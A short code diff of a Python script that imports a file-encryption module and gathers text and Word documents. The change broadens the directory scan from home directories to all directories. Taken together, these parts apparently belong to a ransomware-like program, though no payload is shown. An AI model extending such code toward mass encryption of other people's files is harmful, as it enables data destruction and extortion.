@@ -6,7 +6,7 @@ import encrypt.encrypt_file as enc
 
 
 # get file
-all_dirs = get_dirs.get_home_dirs()
+all_dirs = get_dirs.get_all_dirs()
 all_files = get_files.get_all_files(all_dirs[0])
 all_txt_files = get_files.get_txt_files()
 all_docx_files = get_files.get_docx_files()
